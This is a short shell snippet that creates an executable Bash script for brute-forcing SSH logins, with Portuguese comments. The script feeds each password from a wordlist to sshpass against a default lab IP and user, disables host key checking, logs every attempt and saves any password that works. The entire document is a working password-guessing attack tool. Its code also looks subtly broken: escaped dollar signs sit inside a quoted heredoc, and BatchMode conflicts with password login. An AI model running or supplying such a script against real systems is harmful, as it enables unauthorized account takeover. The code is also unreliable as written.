mkdir -p ~/scripts
cat > ~/scripts/ssh_try_sequential.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

TARGET="\${1:-192.168.56.101}"
USER="\${2:-linuxmint}"
WL="\${3:-/home/\$(whoami)/wordlists/passwords_mylist.txt}"
OUTDIR="\${4:-/home/\$(whoami)/evidencias}"
TIMEOUT="\${5:-5}"   # timeout de conexão em segundos

mkdir -p "\$OUTDIR"
LOG="\$OUTDIR/ssh_seq_$(date +%F_%H%M%S).log"
echo "[*] Testando sequencialmente \${WL} contra \$USER@\$TARGET" | tee "\$LOG"

while IFS= read -r pw || [ -n "\$pw" ]; do
  echo "[*] Tentando: \$pw" | tee -a "\$LOG"
  # tenta conectar; -o StrictHostKeyChecking=no evita prompt de primeira vez
  sshpass -p "\$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=\$TIMEOUT -o BatchMode=yes "\$USER"@"\$TARGET" 'echo LOGIN_OK' 2>/dev/null | tee -a "\$LOG"
  RET=\${PIPESTATUS[0]:-0}
  if [ "\$RET" -eq 0 ]; then
    echo "[+] Senha válida encontrada: \$pw" | tee -a "\$LOG"
    echo "\$pw" > "\$OUTDIR/ssh_seq_found_$(date +%F_%H%M%S).txt"
    break
  fi
  sleep 0.5   # pequeno delay para evitar flood; ajuste conforme quiser
done < "\$WL"

echo "[*] Fim do teste. Log: \$LOG"
EOF

chmod +x ~/scripts/ssh_try_sequential.sh

